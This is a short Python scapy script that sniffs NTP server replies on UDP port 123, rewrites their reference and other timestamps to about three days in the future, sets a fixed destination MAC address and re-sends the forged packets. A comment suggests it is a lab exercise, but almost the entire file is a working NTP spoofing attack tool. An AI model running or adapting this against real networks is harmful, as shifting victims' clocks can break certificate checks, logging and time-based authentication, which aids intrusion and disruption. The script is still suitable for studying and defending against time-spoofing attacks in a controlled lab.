from scapy.all import IP, UDP, NTP, send, sniff, Ether
from scapy.layers.ntp import NTP
import time, datetime


server_ip = "10.10.10.12"
ref_timestamp = time.time() + 259200
#all these values are hard coded for the sake of this exercise
def send_ntp(server, packet, ref_timestamp):
    ntp_packet = packet
    print("incoming packet")
    #ntp_packet.show()
    print()

    ntp_packet[NTP].ref = ref_timestamp
    ntp_packet[NTP].orig = time.time() + 259201
    ntp_packet[NTP].recv = time.time() + 259201
    ntp_packet[NTP].sent = time.time() + 259201
    ntp_packet[Ether].dst = "4e:c1:60:9c:84:bc"

    #ip_packet = IP(src=server, dst=dest_ip)
    #udp_packet = UDP(dport=123, sport=123)
    print("Packet before sending")
    ntp_packet.show()
    #if ntp_packet.haslayer(UDP):
    #    print("new checksum: " + str(ntp_packet[UDP].chksum))
    #else:
    #    print("Packet does not contain UDP layer")
    ntp_packet = ntp_packet.build()
    send(ntp_packet, verbose=True)


def ntp_request(packet):
    ntp_layer = packet.getlayer(NTP)
    if ntp_layer and ntp_layer.mode == 4:
        send_ntp(server_ip, packet, ref_timestamp)

if __name__ == "__main__":
    sniff(filter="udp and port 123", prn=ntp_request)
